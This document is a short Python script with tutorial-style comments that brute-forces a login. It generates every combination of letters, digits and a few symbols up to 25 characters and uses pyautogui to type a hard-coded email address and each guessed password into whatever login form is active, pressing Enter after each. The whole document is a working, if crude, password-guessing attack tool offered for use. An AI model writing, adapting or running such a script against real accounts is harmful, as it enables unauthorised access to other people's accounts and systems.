#A large number of the functions we need come automatically with python but do need to be imported.
import itertools
import time

#This has to be installed and if you are finding errors this is where they are most likely to come from.
import pyautogui

#This is basically a list of all the different characters that will be tried.
#You will notice many symbols missing as they were slowing down efficiency and very unlikely to appear.
Alphabet = ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_.")

#This starts off the number of characters as 1.
CharLength = 1

username = "pancakehax@gmail.com"
#This stops the program once it gets to 25 characters (most people would run out of patience WAY before that
#But if you feel the need you can increase the number.
for CharLength in range(25):
    
    #This finds all of the possible combinations of characters that are of the correct length.
    passwords = (itertools.product(Alphabet, repeat = CharLength))

    #This is the way to print the products of generators.
    for i in passwords:

        #As the itertools.products() returns a tuple, it has to be converted into a sting.
        i = str(i)

        #The parts that were added as a result of conversion from tuple have to be removed.
        i = i.replace("[", "")
        i = i.replace("]", "")
        i = i.replace("'", "")
        i = i.replace(" ", "")
        i = i.replace(",", "")
        i = i.replace("(", "")
        i = i.replace(")", "")
        
        #This prints the username so that the password can then be tried.
        pyautogui.typewrite(username)

        #This presses "enter" in order to tell the website/ computer it has finished typing the username.
        pyautogui.keyDown("enter")
        pyautogui.keyUp("enter")
        
        #This types the attempts
        pyautogui.typewrite(i)
        
        #This presses "enter" in order to tell the website/ computer it has finished typing the password.
        pyautogui.keyDown("enter")
        pyautogui.keyUp("enter")
        
    #This increases the number of characters in the password attempts.
    CharLength += 1
